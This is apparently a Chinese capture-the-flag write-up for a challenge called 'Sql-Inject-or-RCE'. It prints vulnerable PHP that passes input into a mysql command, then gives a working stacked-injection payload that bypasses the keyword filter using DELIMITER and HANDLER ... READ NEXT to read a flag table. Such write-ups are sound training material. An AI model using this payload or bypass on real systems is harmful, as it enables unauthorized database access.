---
title: Sql-Inject-or-RCE
date: 2025-03-27 22:04:19
tags:
- sql注入
- 堆叠注入
- handler读表
- delimiter更改sql语句结束符
category:
- 刷题笔记
---

# Sql-Inject-or-RCE

首先看源码

```
<?php
highlight_file(__FILE__);
$sql = $_GET['sql'];
if (preg_match('/se|ec|st|;|@|delete|into|outfile/i', $sql)) {
    die("你知道的，不可能有sql注入");
}
if (preg_match('/"|\$|`|\\\\/i', $sql)) {
    die("你知道的，不可能有RCE");
}
$query = "mysql -u root -p123456 -e \"use ctf;select 'ctfer! You can\\'t succeed this time! hahaha'; -- " . $sql . "\"";
system($query); ctfer! You can't succeed this time! hahaha ctfer! You can't succeed this time! hahaha
```

这题过滤掉了delete和select，并且分号也被过滤了。

但是在MySQL中有一个命令DELIMITER可以用，用法就是可以利用delimiter来更改一条sql语句的结束符

比如

```
delimiter aa
select aa
```

所以这道题我们可以利用这个delimiter更改结束符，然后来打堆叠注入，利用handler读表来绕过，但是因为first被过滤了，可以用read next来绕过

```
hackbar或者bp中传入

?sql=%0adelimiter cnm%0ahandler flag opencnm%0ahandler flag read+next
```

这里每个命令之前必须加个%0a换行符，并且命令结尾用我们定义的结束符结束

空格可使用url编码%20也可以不用





